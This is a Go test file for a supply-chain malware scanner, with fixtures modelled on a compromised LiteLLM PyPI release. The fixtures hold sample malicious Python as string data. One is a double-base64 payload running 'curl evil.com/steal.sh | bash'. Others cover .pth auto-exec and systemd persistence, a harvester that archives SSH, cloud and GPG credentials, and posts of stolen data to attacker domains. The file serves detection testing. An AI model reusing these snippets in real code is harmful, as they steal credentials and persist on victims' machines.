package scanner

import (
	"encoding/base64"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/falcn-io/falcn/pkg/types"
)

// Tests based on the real LiteLLM PyPI supply chain attack (March 2026).
// TeamPCP compromised litellm v1.82.7 and v1.82.8 via stolen PYPI_PUBLISH token.

func TestLiteLLM_Base64Payload(t *testing.T) {
	cs := NewContentScanner()
	// Simulate a single large base64 payload (like LiteLLM proxy_server.py)
	payload := strings.Repeat("A", 300) // 300-char base64 string
	content := `import litellm
# normal code here
_payload = "` + base64.StdEncoding.EncodeToString([]byte(strings.Repeat("malicious_code();", 20))) + `"
exec(base64.b64decode(_payload))
`
	patterns := cs.detectSuspiciousPatterns(content)
	found := false
	for _, p := range patterns {
		if strings.Contains(p, "base64 payload") || strings.Contains(p, "base64 encoded") {
			found = true
			break
		}
	}
	_ = payload
	if !found {
		t.Errorf("Single large base64 payload should be detected; got patterns: %v", patterns)
	}
}

func TestLiteLLM_DoubleBase64(t *testing.T) {
	cs := NewContentScanner()
	// Double-base64: inner payload encoded twice (LiteLLM v1.82.8 technique)
	// Must be large enough to trigger the 200-char threshold after double encoding
	rawPayload := strings.Repeat("import os; os.system('curl http://evil.com/steal.sh | bash'); ", 5)
	inner := base64.StdEncoding.EncodeToString([]byte(rawPayload))
	outer := base64.StdEncoding.EncodeToString([]byte(inner))
	content := `_data = "` + outer + `"
exec(base64.b64decode(base64.b64decode(_data)))
`
	patterns := cs.detectSuspiciousPatterns(content)
	hasDouble := false
	for _, p := range patterns {
		if strings.Contains(p, "Double-base64") || strings.Contains(p, "CRITICAL") {
			hasDouble = true
			break
		}
	}
	if !hasDouble {
		t.Errorf("Double-base64 encoding should be detected; got patterns: %v", patterns)
	}
}

func TestLiteLLM_PthFilePersistence(t *testing.T) {
	cs := NewContentScanner()

	// .pth file with import (malicious — auto-executes on Python startup)
	maliciousPth := `import os; os.system("python ~/.config/sysmon/sysmon.py &")`
	threats := cs.detectPythonAutoExec("site-packages/litellm_init.pth", maliciousPth)
	if len(threats) == 0 {
		t.Fatal("Malicious .pth file with import should generate a threat")
	}
	if threats[0].Type != types.ThreatTypePythonAutoExec {
		t.Errorf("Expected ThreatTypePythonAutoExec, got %s", threats[0].Type)
	}
	if threats[0].Severity != types.SeverityCritical {
		t.Errorf("Expected CRITICAL severity, got %s", threats[0].Severity)
	}

	// .pth file with only paths (benign — standard use case)
	benignPth := `/usr/lib/python3/dist-packages
/home/user/.local/lib/python3/site-packages`
	threats = cs.detectPythonAutoExec("easy-install.pth", benignPth)
	if len(threats) > 0 {
		t.Errorf("Benign .pth file with only paths should NOT generate threats; got: %v", threats[0].Description)
	}
}

func TestLiteLLM_CredentialHarvesting(t *testing.T) {
	cs := NewContentScanner()
	// Simulates LiteLLM's credential stealer reading multiple sensitive dirs
	content := `
import os, tarfile
paths_to_steal = [
    os.path.expanduser("~/.ssh"),
    os.path.expanduser("~/.aws"),
    os.path.expanduser("~/.kube"),
    os.path.expanduser("~/.config/gcloud"),
    os.path.expanduser("~/.gnupg"),
]
archive = tarfile.open("/tmp/tpcp.tar.gz", "w:gz")
for p in paths_to_steal:
    if os.path.exists(p):
        for f in os.listdir(p):
            archive.add(os.path.join(p, f))
archive.close()
`
	threats := cs.detectCredentialHarvesting(content)
	if len(threats) == 0 {
		t.Fatal("Credential harvesting pattern should be detected")
	}
	if threats[0].Type != types.ThreatTypeCredentialHarvesting {
		t.Errorf("Expected ThreatTypeCredentialHarvesting, got %s", threats[0].Type)
	}
	if threats[0].Severity != types.SeverityCritical {
		t.Errorf("Expected CRITICAL severity, got %s", threats[0].Severity)
	}
}

func TestLiteLLM_SystemdPersistence(t *testing.T) {
	cs := NewContentScanner()
	// Simulates LiteLLM's systemd service persistence
	content := `
import subprocess, os
sysmon_service = """[Unit]
Description=System Monitor
After=network.target

[Service]
ExecStart=/usr/bin/python3 {path}
Restart=always
RestartSec=3000

[Install]
WantedBy=default.target
""".format(path=os.path.expanduser("~/.config/sysmon/sysmon.py"))

service_path = os.path.expanduser("~/.config/systemd/user/sysmon.service")
os.makedirs(os.path.dirname(service_path), exist_ok=True)
with open(service_path, "w") as f:
    f.write(sysmon_service)
subprocess.run(["systemctl", "--user", "daemon-reload"])
subprocess.run(["systemctl", "--user", "enable", "--now", "sysmon.service"])
`
	threats := cs.detectOSPersistence(content)
	if len(threats) == 0 {
		t.Fatal("systemd persistence should be detected")
	}
	if threats[0].Type != types.ThreatTypeOSPersistence {
		t.Errorf("Expected ThreatTypeOSPersistence, got %s", threats[0].Type)
	}
}

func TestLiteLLM_C2Domain(t *testing.T) {
	cs := NewContentScanner()
	// The LiteLLM attack used checkmarx.zone and models.litellm.cloud
	content := `
import requests
requests.post("https://checkmarx.zone/collect", data=stolen_data)
requests.get("https://models.litellm.cloud/config")
`
	indicators := cs.detectNetworkIndicators(content)
	foundZone := false
	foundCloud := false
	for _, ind := range indicators {
		if strings.Contains(ind, "checkmarx.zone") || strings.Contains(ind, ".zone") {
			foundZone = true
		}
		if strings.Contains(ind, "litellm.cloud") || strings.Contains(ind, ".cloud") {
			foundCloud = true
		}
	}
	if !foundZone {
		t.Errorf("checkmarx.zone should be flagged as suspicious TLD; indicators: %v", indicators)
	}
	if !foundCloud {
		t.Errorf("models.litellm.cloud should be flagged; indicators: %v", indicators)
	}
}

func TestLiteLLM_CompoundBase64Exec(t *testing.T) {
	cs := NewContentScanner()
	content := `
import base64, subprocess
payload = base64.b64decode("aW1wb3J0IG9z")
exec(payload)
subprocess.Popen(["python", "-c", payload.decode()])
`
	threats := cs.detectCompoundBehaviors(content)
	if len(threats) == 0 {
		t.Fatal("base64 + exec compound pattern should be detected")
	}
	if threats[0].Type != types.ThreatTypeCompoundObfuscation {
		t.Errorf("Expected ThreatTypeCompoundObfuscation, got %s", threats[0].Type)
	}
}

func TestLiteLLM_FullScan_IntegrationTest(t *testing.T) {
	// Create a temp directory simulating a compromised package
	tmpDir := t.TempDir()

	// Write a .pth file
	pthContent := `import litellm_init; litellm_init.run()`
	os.WriteFile(filepath.Join(tmpDir, "litellm_init.pth"), []byte(pthContent), 0644)

	// Write a malicious proxy_server.py
	proxyContent := `
import os, base64, subprocess
_p = "` + base64.StdEncoding.EncodeToString([]byte(strings.Repeat("os.system('steal');", 20))) + `"
exec(base64.b64decode(_p))
paths = [os.path.expanduser("~/.ssh"), os.path.expanduser("~/.aws")]
for p in paths:
    open(p + "/id_rsa").read()
`
	os.WriteFile(filepath.Join(tmpDir, "proxy_server.py"), []byte(proxyContent), 0644)

	cs := NewContentScanner()
	threats, err := cs.ScanDirectory(tmpDir)
	if err != nil {
		t.Fatalf("ScanDirectory failed: %v", err)
	}

	// Should find multiple threat types
	threatTypes := map[types.ThreatType]bool{}
	for _, th := range threats {
		threatTypes[th.Type] = true
	}

	if len(threats) == 0 {
		t.Fatal("Integration test should find threats in simulated LiteLLM attack")
	}

	t.Logf("Found %d threats across %d types", len(threats), len(threatTypes))
	for tt := range threatTypes {
		t.Logf("  - %s", tt)
	}
}
